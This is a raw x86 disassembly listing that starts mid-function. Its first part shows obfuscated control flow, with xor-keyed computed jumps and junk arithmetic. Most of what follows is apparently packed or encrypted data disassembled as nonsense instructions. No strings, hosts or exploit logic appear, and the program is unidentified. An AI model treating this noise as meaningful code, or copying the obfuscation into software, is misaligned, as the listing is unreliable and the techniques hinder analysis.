  408a3d:	add    eax,edi
  408a3f:	mov    DWORD PTR ds:0x428e3d,0x1847
  408a49:	cmp    ecx,eax
  408a4b:	mov    DWORD PTR ds:0x428e41,0x373f
  408a55:	je     0x408a7d
  408a5b:	movzx  ecx,WORD PTR ds:0x428e49
  408a62:	mov    eax,DWORD PTR [ebp-0x34]
  408a65:	movzx  eax,WORD PTR [eax+ebx*2]
  408a69:	mov    ecx,DWORD PTR ds:0x428e4d
  408a6f:	mov    ecx,DWORD PTR [ebp-0x14]
  408a72:	mov    eax,DWORD PTR [ecx+eax*4]
  408a75:	mov    DWORD PTR [ebp-0x38],eax
  408a78:	jmp    0x408990
  408a7d:	mov    eax,DWORD PTR [ebp-0xc]
  408a80:	xor    eax,esi
  408a82:	lea    ebx,[ebx+eax*1+0x3272f8]
  408a89:	jmp    0x4086d2
  408a8e:	mov    eax,DWORD PTR [ebp-0x4]
  408a91:	xor    eax,esi
  408a93:	add    eax,edi
  408a95:	jmp    0x40f699
  408a9a:	mov    eax,DWORD PTR [ebp-0x38]
  408a9d:	add    eax,DWORD PTR [ebp+0x8]
  408aa0:	mov    DWORD PTR [ebp-0x18],eax
  408aa3:	mov    eax,DWORD PTR [ebp-0x1c]
  408aa6:	test   eax,eax
  408aa8:	je     0x40d282
  408aae:	mov    DWORD PTR [ebp-0x20],0x0
  408ab5:	push   0x4
  408ab7:	xor    edx,edx
  408ab9:	pop    edx
  408aba:	add    edx,0x9
  408abd:	push   edx
  408abe:	pop    ecx
  408abf:	push   0x8
  408ac1:	dec    ecx
  408ac2:	pop    ebx
  408ac3:	dec    ebx
  408ac4:	xchg   ebx,ecx
  408ac6:	sub    ebx,ecx
  408ac8:	xchg   ebx,ecx
  408aca:	dec    ecx
  408acb:	mov    eax,DWORD PTR [ebp-0x1c]
  408ace:	imul   eax,ecx
  408ad1:	sub    esp,eax
  408ad3:	mov    DWORD PTR [ebp-0x20],esp
  408ad6:	mov    eax,DWORD PTR [ebp-0x4]
  408ad9:	xor    eax,esi
  408adb:	add    eax,edi
  408add:	jmp    0x40aebb
  408ae2:	mov    ecx,DWORD PTR [ebp-0xc]
  408ae5:	mov    eax,DWORD PTR [ebp+0x8]
  408ae8:	mov    edx,DWORD PTR [ebp+0x14]
  408aeb:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  408aef:	xor    ecx,esi
  408af1:	add    ecx,edi
  408af3:	xor    edx,edx
  408af5:	div    ecx
  408af7:	mov    ecx,DWORD PTR [ebp-0x4]
  408afa:	xor    ecx,esi
  408afc:	lea    eax,[ecx+eax*1+0x3272f8]
  408b03:	mov    ecx,DWORD PTR [ebp+0x8]
  408b06:	mov    edx,DWORD PTR [ebp-0x20]
  408b09:	jmp    0x40aea9
  408b0e:	fbstp  TBYTE PTR [ebp*1-0xe9985a5]
  408b15:	cmp    cl,dh
  408b17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408b18:	fnstsw WORD PTR [ecx-0x74]
  408b1b:	lods   eax,DWORD PTR ds:[esi]
  408b1c:	mov    esp,0x7be429c2
  408b21:	jnp    0x408b21
  408b23:	sahf   
  408b24:	jnp    0x408ba1
  408b26:	mov    eax,ds:0x168fb03e
  408b2b:	lods   al,BYTE PTR ds:[esi]
  408b2c:	jbe    0x408aef
  408b2e:	adc    DWORD PTR [ecx],edi
  408b30:	pop    es
  408b31:	mov    edi,0xed6f622e
  408b36:	nop    DWORD PTR [eax+esi*2+0x686817ed]
  408b3e:	in     al,dx
  408b3f:	popa   
  408b40:	jge    0x408ba2
  408b42:	shl    eax,cl
  408b44:	std    
  408b45:	push   ebp
  408b46:	ror    DWORD PTR [eax+0x35],cl
  408b49:	sub    al,0x7c
  408b4b:	fs std 
  408b4d:	add    ch,BYTE PTR [ecx]
  408b4f:	adc    eax,0x4bba813f
  408b54:	mov    bh,0x1
  408b56:	test   bl,0x50
  408b59:	in     eax,dx
  408b5a:	stc    
  408b5b:	adc    DWORD PTR [eax+0x0],eax
  408b5e:	call   0xb01d554a
  408b63:	call   0xef68:0x9b884062
  408b6a:	cmp    eax,0x915f3dd5
  408b6f:	out    0xab,eax
  408b71:	dec    ebx
  408b72:	sti    
  408b73:	sbb    bh,al
  408b75:	sub    eax,0x3c76a3cf
  408b7a:	repz jl 0x408b5d
  408b7d:	jle    0x408b7e
  408b7f:	loope  0x408b87
  408b81:	dec    edx
  408b82:	jmp    0x1d1aa37e
  408b87:	nop
  408b88:	out    dx,eax
  408b89:	mov    ebx,0xacf1f77f
  408b8e:	mov    dh,0x65
  408b90:	stc    
  408b91:	dec    ecx
  408b92:	shl    BYTE PTR [eax],0x5
  408b95:	xor    dh,BYTE PTR [ebx]
  408b97:	push   esi
  408b98:	imul   edi,DWORD PTR [ebx+esi*4-0x3d6e0413],0x27
  408ba0:	pop    ds
  408ba1:	int3   
  408ba2:	dec    esp
  408ba3:	adc    edi,DWORD PTR [esi-0x2648aebd]
  408ba9:	inc    ecx
  408baa:	fdivrp st(4),st
  408bac:	sub    eax,0x4b532730
  408bb1:	sbb    BYTE PTR [esi-0x38646949],0x24
  408bb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408bb9:	ss fdivrp st(3),st
  408bbc:	add    DWORD PTR [edi-0x49],ecx
  408bbf:	lds    esp,FWORD PTR [esi+eiz*8-0x6c]
  408bc3:	fcmovb st,st(5)
  408bc5:	sub    DWORD PTR [ecx+edx*2+0x47],ebx
  408bc9:	int3   
  408bca:	int    0x99
  408bcc:	pop    edi
  408bcd:	(bad)  
  408bce:	cmp    eax,0xe5ad2c22
  408bd3:	lea    edx,[ecx+0x2d]
  408bd6:	fsubp  st(1),st
  408bd8:	add    esp,eax
  408bda:	add    al,0xca
  408bdc:	fldcw  WORD PTR [ecx]
  408bde:	mov    edx,0x9384a6c4
  408be3:	inc    eax
  408be4:	and    BYTE PTR [edx+0x33b06a8a],al
  408bea:	fistp  WORD PTR [eax-0x79]
  408bed:	retf   
  408bee:	stos   BYTE PTR es:[edi],al
  408bef:	enter  0xaf26,0x10
  408bf3:	leave  
  408bf4:	retf   0xa96
  408bf7:	imul   esp,edi,0xce0a743c
  408bfd:	push   es
  408bfe:	scas   al,BYTE PTR es:[edi]
  408bff:	jns    0x408c4e
  408c01:	xor    BYTE PTR [eax-0xfeff624],cl
  408c07:	in     al,dx
  408c08:	dec    ebx
  408c09:	bound  esi,QWORD PTR [eax+0x31]
  408c0c:	mov    al,0xa6
  408c0e:	dec    esp
  408c0f:	jns    0x408b95
  408c11:	int3   
  408c12:	mov    ch,0x53
  408c14:	int    0x90
  408c16:	add    BYTE PTR [edi],dl
  408c18:	stos   BYTE PTR es:[edi],al
  408c19:	cmp    dh,dh
  408c1b:	(bad)  
  408c1c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408c1d:	push   ds
  408c1e:	sub    DWORD PTR [ecx],edi
  408c20:	cmp    ebp,esp
  408c22:	push   cs
  408c23:	mov    ds:0x6b458f29,eax
  408c28:	inc    eax
  408c29:	sbb    al,0x54
  408c2b:	dec    DWORD PTR [eax+0x6cae0e09]
  408c31:	and    edx,DWORD PTR [esi+0xa]
  408c34:	sub    eax,edx
  408c36:	pop    eax
  408c37:	nop
  408c38:	lods   eax,DWORD PTR ds:[esi]
  408c39:	adc    al,0xb1
  408c3b:	mov    eax,0xeaa9c09e
  408c40:	popf   
  408c41:	stc    
  408c42:	adc    al,0xcb
  408c44:	or     al,0x28
  408c46:	(bad)  
  408c47:	fisttp WORD PTR [ecx]
  408c49:	xor    BYTE PTR [eax+0x48],dl
  408c4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408c4d:	in     eax,dx
  408c4e:	add    al,0x8a
  408c50:	xor    al,0xa
  408c52:	test   al,0x52
  408c54:	mov    eax,ds
  408c56:	fst    DWORD PTR [ebx-0x5c3b22f1]
  408c5c:	pop    ds
  408c5d:	arpl   WORD PTR [ecx+0x10582411],di
  408c63:	icebp  
  408c64:	or     WORD PTR [edi+0x60],0xffa7
  408c69:	xchg   ebp,eax
  408c6a:	adc    BYTE PTR [edx+0x2bbaf0df],dl
  408c70:	fadd   QWORD PTR [ebp+0x5]
  408c73:	fs sbb ebx,0xfffffff3
  408c77:	adc    bl,cl
  408c79:	popf   
  408c7a:	xor    eax,DWORD PTR [esi-0x7f]
  408c7d:	sbb    ah,BYTE PTR [edi]
  408c7f:	loop   0x408c69
  408c81:	adc    esp,DWORD PTR [edi-0x2a85655d]
  408c87:	hlt    
  408c88:	inc    ecx
  408c89:	adc    eax,0xf21d432e
  408c8e:	addr16 pushf 
  408c90:	add    bl,BYTE PTR ds:0x45fecef7
  408c96:	push   eax
  408c97:	lods   eax,DWORD PTR ds:[esi]
  408c98:	pop    edx
  408c99:	mov    esi,0x32dbc450
  408c9e:	push   ss
  408c9f:	pop    ecx
  408ca0:	sub    al,0x7e
  408ca2:	out    dx,al
  408ca3:	call   0xbe1f56c0
  408ca8:	fcmovnbe st,st(5)
  408caa:	push   edx
  408cab:	popf   
  408cac:	and    BYTE PTR [edi-0x7952a845],ch
  408cb2:	dec    esi
  408cb3:	(bad)  
  408cb5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408cb6:	out    dx,eax
  408cb7:	sbb    ecx,esp
  408cb9:	addr16 (bad) 
  408cbb:	pop    edx
  408cbc:	adc    eax,0x5ab55208
  408cc1:	scas   eax,DWORD PTR es:[edi]
  408cc2:	div    ah
  408cc4:	je     0x408c97
  408cc6:	cmp    edx,esi
  408cc8:	inc    eax
  408cc9:	pusha  
  408cca:	dec    edx
  408ccb:	lods   eax,DWORD PTR ds:[esi]
  408ccc:	cmc    
  408ccd:	stos   BYTE PTR es:[edi],al
  408cce:	popa   
  408ccf:	sbb    DWORD PTR es:[esp+esi*1+0x65],edx
  408cd4:	jge    0x408ce7
  408cd6:	jnp    0x408c91
  408cd8:	xor    al,0xda
  408cda:	mov    bl,0x68
  408cdc:	test   DWORD PTR [edx+0x2ece58b6],ebx
  408ce2:	cld    
  408ce3:	sbb    BYTE PTR [edi-0x17],ah
  408ce6:	add    eax,0xd4b458bd
  408ceb:	xor    al,0xd
  408ced:	rol    esp,cl
  408cef:	add    BYTE PTR [eax],bh
  408cf1:	popa   
  408cf2:	mov    BYTE PTR [ecx+0x53bf1f06],ch
  408cf8:	clc    
  408cf9:	mov    al,BYTE PTR [edx+0x78483e9f]
  408cff:	jo     0x408d73
  408d01:	addr16 add al,0x10
  408d04:	mov    al,BYTE PTR [eax]
  408d06:	xchg   esp,eax
  408d07:	sbb    al,0xc5
  408d09:	in     al,dx
  408d0a:	add    eax,edx
  408d0c:	xchg   ebx,eax
  408d0d:	dec    eax
  408d0e:	xchg   ebp,eax
  408d0f:	sbb    eax,0xaa7bb183
  408d14:	jecxz  0x408d54
  408d16:	mov    esi,0x1f3fae99
  408d1b:	inc    eax
  408d1c:	jp     0x408d44
  408d1e:	jg     0x408d3d
  408d20:	jno    0x408cab
  408d22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d23:	jge    0x408caa
  408d25:	lods   eax,DWORD PTR ds:[esi]
  408d26:	popf   
  408d27:	imul   ecx,DWORD PTR [esi+0x5b],0xffffffde
  408d2b:	xchg   ecx,eax
  408d2c:	pop    esp
  408d2d:	sub    eax,0x359c8d36
  408d32:	cli    
  408d33:	popf   
  408d34:	mov    edx,0x8bf3f206
  408d39:	scas   eax,DWORD PTR es:[edi]
  408d3a:	mov    eax,0x3fd53f1
  408d3f:	das    
  408d40:	fwait
  408d41:	push   esi
  408d42:	not    BYTE PTR [eax]
  408d44:	or     DWORD PTR [esi],esp
  408d46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408d47:	pop    ebx
  408d48:	enter  0xed17,0xde
  408d4c:	add    eax,0x488d1c47
  408d51:	dec    esp
  408d52:	mov    bl,0x7d
  408d54:	or     DWORD PTR [edi],esi
  408d56:	hlt    
  408d57:	pop    edx
  408d58:	div    BYTE PTR [ebx+0x60e5273e]
  408d5e:	and    DWORD PTR [eax],ebx
  408d60:	sar    BYTE PTR [ebx-0x24],1
  408d63:	das    
  408d64:	xchg   BYTE PTR [eax-0x38414262],dh
  408d6a:	mov    al,0x3a
  408d6c:	scas   al,BYTE PTR es:[edi]
  408d6d:	test   DWORD PTR [ebx],esi
  408d6f:	mov    ebx,DWORD PTR [esi-0x7e]
  408d72:	pop    ebp
  408d73:	cmp    DWORD PTR [ecx+0x46],0xc3ffa6fd
  408d7a:	jle    0x408d96
  408d7c:	push   ebp
  408d7d:	pop    esi
  408d7e:	sar    BYTE PTR [edx-0x35992a4b],1
  408d84:	pop    ss
  408d85:	cmp    edx,DWORD PTR [eax+0x23]
  408d88:	mov    ds,WORD PTR [esi]
  408d8a:	mov    ?,WORD PTR [esi-0x7a45edfc]
  408d90:	sub    dh,BYTE PTR [ecx+ecx*2-0x48]
  408d94:	add    bh,ah
  408d96:	fmul   DWORD PTR [edi+0x1f]
  408d99:	xor    eax,0x4b697d97
  408d9e:	in     al,dx
  408d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408da0:	push   ecx
  408da1:	cmc    
  408da2:	js     0x408dc1
  408da4:	and    esp,DWORD PTR [edi]
  408da6:	fild   WORD PTR [esi]
  408da8:	das    
  408da9:	add    DWORD PTR [edi+0x1c751ca3],esi
  408daf:	sub    al,0x6a
  408db1:	or     al,0x44
  408db3:	or     eax,0x2b023b10
  408db8:	outs   dx,BYTE PTR ds:[esi]
  408db9:	inc    edx
  408dba:	and    dh,0xb2
  408dbd:	jnp    0x408e0a
  408dbf:	daa    
  408dc0:	in     al,0xce
  408dc2:	xor    al,BYTE PTR [ebp+0x4a]
  408dc5:	(bad)  
  408dc7:	jb     0x408e43
  408dc9:	xchg   edi,eax
  408dca:	mov    edx,0x37186e26
  408dcf:	aad    0xbd
  408dd1:	add    al,0x17
  408dd3:	outs   dx,BYTE PTR ds:[esi]
  408dd4:	pop    eax
  408dd5:	and    dl,BYTE PTR [esi+0x482b618c]
  408ddb:	jmp    0x9f6a:0x2395491d
  408de2:	pop    esp
  408de3:	lds    esi,FWORD PTR cs:[esp+edi*2]
  408de7:	mov    ds:0xd8a12fbc,al
  408dec:	pop    ebp
  408ded:	out    dx,al
  408dee:	mov    cl,0x61
  408df0:	out    dx,al
  408df1:	cmc    
  408df2:	dec    ebx
  408df3:	psubq  mm1,QWORD PTR [edx-0x21]
  408df7:	(bad)  [eax+0x3e80a1c7]
  408dfd:	mov    eax,0xd1903fe4
  408e02:	sub    ebx,DWORD PTR [esi+0x10]
  408e05:	pmaxub mm5,mm6
  408e08:	stc    
  408e09:	or     eax,0x97b6cd5c
  408e0e:	test   DWORD PTR [ebp+0x40],ecx
  408e11:	cdq    
  408e12:	fld    QWORD PTR [ebx]
  408e14:	cmp    al,0x68
  408e16:	sti    
  408e17:	xchg   esp,eax
  408e18:	dec    ebx
  408e19:	aaa    
  408e1a:	cmp    BYTE PTR [edi+ebx*4-0x140c7c2c],dl
  408e21:	dec    ebx
  408e22:	je     0x408e9d
  408e24:	dec    eax
  408e25:	adc    eax,DWORD PTR [ebx+0x77]
  408e28:	test   DWORD PTR [eax-0x6c],eax
  408e2b:	or     ebx,esi
  408e2d:	dec    sp
  408e2f:	aam    0x31
  408e31:	imul   eax,DWORD PTR [edx],0xfffffff2
  408e34:	jo     0x408de0
  408e36:	outs   dx,BYTE PTR ds:[esi]
  408e37:	scas   al,BYTE PTR es:[edi]
  408e38:	pop    esp
  408e39:	mov    eax,ds:0xe3f38456
  408e3e:	in     al,0x2b
  408e40:	stc    
  408e41:	pusha  
  408e42:	dec    esi
  408e43:	out    dx,al
  408e44:	sub    ebx,DWORD PTR [esi+0x73fa6336]
  408e4a:	fld    QWORD PTR [ebx]
  408e4c:	push   ecx
  408e4d:	and    eax,0x9885c270
  408e52:	pop    esi
  408e53:	retf   
  408e54:	stc    
  408e55:	jnp    0x408e1e
  408e57:	sti    
  408e58:	xchg   esi,eax
  408e59:	inc    ebp
  408e5a:	jge    0x408e6d
  408e5c:	push   esi
  408e5d:	out    dx,eax
  408e5e:	jbe    0x408e83
  408e60:	ss jl  0x408e06
  408e63:	ds stos BYTE PTR es:[edi],al
  408e65:	xchg   esp,eax
  408e66:	fisubr DWORD PTR [eax+0x2e]
  408e69:	outs   dx,BYTE PTR ds:[esi]
  408e6a:	sub    cl,BYTE PTR ds:0x57b5d40
  408e70:	mov    ?,edi
  408e72:	or     al,BYTE PTR [ebp+0x171afdca]
  408e78:	or     BYTE PTR [ebp-0x3d],0xe6
  408e7c:	test   ebp,esi
  408e7e:	pop    es
  408e7f:	sbb    al,BYTE PTR [edx-0x5]
  408e82:	jb     0x408ecc
  408e84:	xor    BYTE PTR [ebx],dl
  408e86:	add    eax,0xc514da53
  408e8b:	xor    eax,0x81e5a550
  408e90:	add    eax,esp
  408e92:	jl     0x408e75
  408e94:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408e95:	fcomp  QWORD PTR [esi-0x44]
  408e98:	jae    0x408ec2
  408e9a:	imul   esp,esp,0xacc788f8
  408ea0:	sub    edi,esi
  408ea2:	fistp  WORD PTR [esi]
  408ea4:	pop    ss
  408ea5:	pop    esi
  408ea6:	(bad)  
  408ea7:	push   ss
  408ea8:	adc    BYTE PTR [edx-0x5a],cl
  408eab:	aas    
  408eac:	mov    edi,0x6b0baf84
  408eb1:	test   DWORD PTR ds:0xa0896e1b,esi
  408eb7:	and    esp,DWORD PTR [edx]
  408eb9:	inc    ebp
  408eba:	ss jae 0x408e4f
  408ebd:	jb     0x408eb4
  408ebf:	sbb    bh,BYTE PTR [ebp-0x3b946c35]
  408ec5:	scas   eax,DWORD PTR es:[edi]
  408ec6:	ins    DWORD PTR es:[edi],dx
  408ec7:	popf   
  408ec8:	mov    dh,0xff
  408eca:	cdq    
  408ecb:	xchg   ebp,eax
  408ecc:	inc    edx
  408ecd:	mov    edx,0x1e640e
  408ed2:	push   edx
  408ed3:	sbb    BYTE PTR [edx-0x63a4f682],al
  408ed9:	xor    ebx,DWORD PTR [ecx+edi*1+0x14c06b20]
  408ee0:	or     bl,bh
  408ee2:	xchg   ebp,eax
  408ee3:	pop    es
  408ee4:	and    eax,0xc266a70b
  408ee9:	adc    BYTE PTR [eax+eax*1-0x4f47d239],ch
  408ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408ef1:	lock dec eax
  408ef3:	out    dx,eax
  408ef4:	adc    cl,BYTE PTR [ecx]
  408ef6:	pop    esi
  408ef7:	out    dx,al
  408ef8:	xchg   ecx,eax
  408ef9:	test   BYTE PTR [ebp-0x1221abf0],0x35
  408f00:	inc    edi
  408f01:	(bad)  
  408f02:	imul   eax,DWORD PTR [ebp-0x8],0x34
  408f06:	or     ah,bh
  408f08:	sbb    al,0x3e
  408f0a:	or     DWORD PTR [eax+edi*4+0x71604ea8],edi
  408f11:	in     eax,0x1f
  408f13:	icebp  
  408f14:	add    edx,edx
  408f16:	ins    BYTE PTR es:[edi],dx
  408f17:	push   esp
  408f18:	scas   al,BYTE PTR es:[edi]
  408f19:	inc    eax
  408f1a:	idiv   ah
  408f1c:	jnp    0x408eb2
  408f1e:	idiv   DWORD PTR [ebx+0x7e]
  408f21:	iret   
  408f22:	xchg   dx,ax
  408f24:	sub    eax,0x23443402
  408f29:	and    DWORD PTR [eax+0x573a7e31],edx
  408f2f:	popa   
  408f30:	jbe    0x408f79
  408f32:	adc    dh,BYTE PTR [esi-0x57]
  408f35:	call   0x9f2d563b
  408f3a:	cmp    dh,BYTE PTR [edi+0x79]
  408f3d:	rcl    ebx,cl
  408f3f:	test   DWORD PTR [ebp-0x57c723ef],ebx
  408f45:	sbb    dh,BYTE PTR [ecx]
  408f47:	loopne 0x408efd
  408f49:	into   
  408f4a:	aad    0xeb
  408f4c:	ins    BYTE PTR es:[edi],dx
  408f4d:	mov    esi,0xe630a2da
  408f52:	dec    ebx
  408f53:	mov    edi,0x32a43723
  408f58:	jmp    0x299766dc
  408f5d:	pushf  
  408f5e:	sti    
  408f5f:	adc    BYTE PTR [ebp+esi*4-0x585cd013],bl
  408f66:	fxch   st(6)
  408f68:	ret    
  408f69:	push   DWORD PTR ds:0xa2941ce
  408f6f:	sub    BYTE PTR [ebp-0xf],al
  408f72:	and    ecx,DWORD PTR [ebx+0x95fb37e]
  408f78:	stos   BYTE PTR es:[edi],al
  408f79:	push   0xd823e6e3
  408f7e:	pop    edi
  408f7f:	popa   
  408f80:	push   ebx
  408f81:	adc    ch,ah
  408f83:	dec    edx
  408f84:	pop    ebp
  408f85:	or     eax,0xee871df6
  408f8a:	aam    0xb7
  408f8c:	dec    edi
  408f8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f8e:	mov    ch,0x79
  408f90:	mov    edx,DWORD PTR [eax+0x5f]
  408f93:	xlat   BYTE PTR ds:[ebx]
  408f94:	jbe    0x408f40
  408f96:	repz jg 0x408f3f
  408f99:	test   al,0x61
  408f9b:	and    al,0x8f
  408f9d:	fidiv  WORD PTR [esi+edx*8-0x5f]
  408fa1:	call   0xa83a:0xe0186065
  408fa8:	(bad)  
  408fa9:	js     0x408fa1
  408fab:	ror    BYTE PTR ds:0x3e66bfb2,cl
  408fb1:	jbe    0x408f5c
  408fb3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408fb4:	or     ch,cl
  408fb6:	stos   BYTE PTR es:[edi],al
  408fb7:	pop    ebx
  408fb8:	rol    DWORD PTR [eax-0x38396512],1
  408fbe:	add    ah,BYTE PTR [eax+0x52]
  408fc1:	or     edx,DWORD PTR ds:0xc8557fc4
  408fc7:	pop    esi
  408fc8:	push   edi
  408fc9:	push   eax
  408fca:	call   0xdbd02c4e
  408fcf:	rcl    al,0x3e
  408fd2:	clc    
  408fd3:	outs   dx,DWORD PTR ds:[esi]
  408fd4:	bound  ebx,QWORD PTR [ebp-0x540e02f8]
  408fda:	dec    edx
  408fdb:	(bad)  
  408fdc:	and    DWORD PTR [edx],0x15
  408fdf:	(bad)  
  408fe0:	scas   al,BYTE PTR es:[edi]
  408fe1:	push   eax
  408fe2:	sbb    eax,edi
  408fe4:	xchg   BYTE PTR [edx+eax*4-0x20b1ae2c],al
  408feb:	ss retf 
  408fed:	dec    ebx
  408fee:	sub    BYTE PTR cs:[ebp-0x1fe37ea3],ch
  408ff5:	cmp    al,0x74
  408ff7:	cmc    
  408ff8:	push   esp
  408ff9:	(bad)  
  408ffa:	cli    
  408ffb:	xchg   esp,eax
  408ffc:	pop    esi
  408ffd:	inc    ecx
  408ffe:	jp     0x408fd6
  409000:	mov    esp,0x8a340abe
  409005:	mov    eax,0xfcfeb22c
  40900a:	fisttp QWORD PTR [edi-0x1b]
  40900d:	mov    al,0x4e
  40900f:	retf   0x6b64
  409012:	dec    eax
  409013:	hlt    
  409014:	sbb    DWORD PTR es:[edx-0x361be3a1],0xffffffa5
  40901c:	enter  0xb266,0x8
  409020:	xor    al,0xa6
  409022:	out    0x8f,al
  409024:	aaa    
  409025:	outs   dx,DWORD PTR ds:[esi]
  409026:	mov    esp,0xf0a82b99
  40902b:	imul   esp,DWORD PTR [eax+0x6f3ba54a],0xa14b2efd
  409035:	adc    DWORD PTR [edx+ecx*1-0x5a],0xffffff81
  40903a:	in     al,dx
  40903b:	jmp    0x9fd9fddf
  409040:	stos   DWORD PTR es:[edi],eax
  409041:	ret    0x4744
  409044:	inc    esp
  409045:	xchg   esi,eax
  409046:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409047:	test   BYTE PTR [esi],0x6b
  40904a:	mov    ebp,0x8c99547b
  40904f:	inc    ecx
  409050:	or     ecx,esp
  409052:	push   edx
  409053:	sub    DWORD PTR [ebp+edi*8-0x255ea143],eax
  40905a:	leave  
  40905b:	imul   ecx,ebp,0xb
  40905e:	nop
  40905f:	into   
  409060:	jbe    0x40908d
  409062:	mov    esi,0x5ceda442
  409067:	dec    eax
  409068:	pop    ds
  409069:	pop    eax
  40906a:	call   0xddbb:0x2cd75e2b
  409071:	fbld   TBYTE PTR [eax+ebx*2+0x500cb6df]
  409078:	jo     0x409001
  40907a:	or     al,0xe
  40907c:	aam    0x4d
  40907e:	mov    ch,0x47
  409080:	pushf  
  409081:	xor    ebp,DWORD PTR [esi]
  409083:	ja     0x4090ba
  409085:	or     ebx,ebx
  409087:	push   edi
  409088:	xchg   DWORD PTR [edi-0x62],edi
  40908b:	fdiv   DWORD PTR [edi+0x74]
  40908e:	fld    TBYTE PTR [eax]
  409090:	repnz bound ebp,QWORD PTR [ecx+0x56]
  409094:	ret    0xc4eb
  409097:	fmul   DWORD PTR [esi]
  409099:	stos   DWORD PTR es:[edi],eax
  40909a:	mov    bh,0x97
  40909c:	jne    0x409055
  40909e:	push   edi
  40909f:	add    BYTE PTR [edi+0x75d76274],0xaa
  4090a6:	xor    esp,ebx
  4090a8:	xor    eax,0xb5331fdc
  4090ad:	cmp    ecx,DWORD PTR [ebx]
  4090af:	xor    eax,DWORD PTR [edx]
  4090b1:	pop    ds
  4090b2:	pop    ebx
  4090b3:	xor    dl,bl
  4090b5:	xchg   edi,eax
  4090b6:	mov    edx,0x324bcfea
  4090bb:	aas    
  4090bc:	ins    DWORD PTR es:[edi],dx
  4090bd:	hlt    
  4090be:	dec    ebx
  4090bf:	(bad)  
  4090c0:	lahf   
  4090c1:	or     DWORD PTR [edi],esp
  4090c3:	fisubr DWORD PTR [ecx+0x76]
  4090c6:	dec    edi
  4090c7:	bnd js 0x409114
  4090ca:	jmp    0x40905a
  4090cc:	test   DWORD PTR [ebx+edx*1],eax
  4090cf:	xchg   ebx,eax
  4090d0:	call   0xdf425375
  4090d5:	pop    es
  4090d6:	jns    0x409103
  4090d8:	jb     0x4090b5
  4090da:	xor    eax,0x32d9f1e4
  4090df:	daa    
  4090e0:	test   al,0x49
  4090e2:	out    0x5a,al
  4090e4:	sub    BYTE PTR [eax+0x4c78c49d],ch
  4090ea:	out    dx,al
  4090eb:	ins    BYTE PTR es:[edi],dx
  4090ec:	xor    ecx,DWORD PTR [ecx-0x8f51550]
  4090f2:	aas    
  4090f3:	xor    bh,BYTE PTR [esi+0x4d0883a5]
  4090f9:	test   DWORD PTR [eax],0x23895a97
  4090ff:	or     esi,esp
  409101:	push   ds
  409102:	in     eax,0x86
  409104:	not    BYTE PTR [ebp*8-0x2b40fd89]
  40910b:	es loope 0x4090bd
  40910e:	jae    0x40917a
  409110:	rol    DWORD PTR [ecx+0x27],cl
  409113:	pop    esp
  409114:	fwait
  409115:	pop    ss
  409116:	mov    dh,0xd9
  409118:	lods   al,BYTE PTR ds:[esi]
  409119:	sub    ah,BYTE PTR [eax]
  40911b:	imul   ebx,esp,0xffffffb2
  40911e:	jo     0x409156
  409120:	mov    edx,DWORD PTR [ebx-0xc]
  409123:	loop   0x409179
  409125:	inc    ecx
  409126:	fdiv   QWORD PTR [esi-0x3]
  409129:	jmp    0x4090f0
  40912b:	jle    0x409143
  40912d:	nop
  40912e:	and    al,BYTE PTR [eax]
  409130:	mov    al,ds:0xe3bbcc0
  409135:	sbb    DWORD PTR [ebx+ecx*4],eax
  409138:	in     al,0xb0
  40913a:	and    BYTE PTR [eax],ch
  40913c:	mov    ah,0x27
  40913e:	inc    edx
  40913f:	aad    0x10
  409141:	mov    al,ds:0xee2840c9
  409146:	ins    DWORD PTR es:[edi],dx
  409147:	sub    BYTE PTR [ecx+0x3],dh
  40914a:	and    BYTE PTR [ecx],bh
  40914c:	jne    0x4091c2
  40914e:	mov    ecx,0x61c36701
  409153:	push   0x4c8d1feb
  409158:	fisub  DWORD PTR [ebp+0x3d]
  40915b:	dec    edx
  40915c:	sbb    ecx,DWORD PTR [edi-0x40]
  40915f:	sub    esi,DWORD PTR [ecx+0x745d3683]
  409165:	addr16 data16 int 0x55
  409169:	inc    ebp
  40916a:	fnstenv [ecx+ebp*2-0x6b]
  40916e:	into   
  40916f:	and    al,0xf3
  409171:	shr    edx,cl
  409173:	push   ecx
  409174:	rcl    DWORD PTR [ebp+0x7001e621],1
  40917a:	cwde   
  40917b:	push   esi
  40917c:	es loop 0x4091eb
  40917f:	aas    
  409180:	sbb    bh,BYTE PTR [eax]
  409182:	sbb    ebp,edx
  409184:	pop    es
  409185:	adc    eax,0x8989cde7
  40918a:	in     al,0xcb
  40918c:	dec    edx
  40918d:	sbb    ebx,DWORD PTR [edi-0xb956997]
  409193:	sahf   
  409194:	ja     0x40915d
  409196:	pop    ebx
  409197:	or     edx,DWORD PTR cs:0x20a44b50
  40919e:	push   ss
  40919f:	push   edi
  4091a0:	pop    ss
  4091a1:	clc    
  4091a2:	xchg   ecx,eax
  4091a3:	in     al,0x28
  4091a5:	addr16 add al,0xe4
  4091a8:	gs aas 
  4091aa:	shl    DWORD PTR [esi+esi*1],cl
  4091ad:	ret    
  4091ae:	jle    0x409227
  4091b0:	cmp    DWORD PTR [ecx+0x23],esp
  4091b3:	mov    ds:0xa6ac27ee,eax
  4091b8:	or     BYTE PTR [ebp+0x30],dl
  4091bb:	xor    bl,dl
  4091bd:	aam    0x51
  4091bf:	cmp    eax,DWORD PTR [edi-0xc]
  4091c2:	jg     0x409180
  4091c4:	pushf  
  4091c5:	mov    ah,0x52
  4091c7:	js     0x4091da
  4091c9:	shr    dl,1
  4091cb:	sbb    DWORD PTR [eax+0x26],0x522f17ca
  4091d2:	mul    ebp
  4091d4:	dec    ebp
  4091d5:	xchg   edx,eax
  4091d6:	pushf  
  4091d7:	(bad)  [ecx]
  4091d9:	jo     0x4091e1
  4091db:	mov    al,ds:0xc1732fc0
  4091e0:	cs push edx
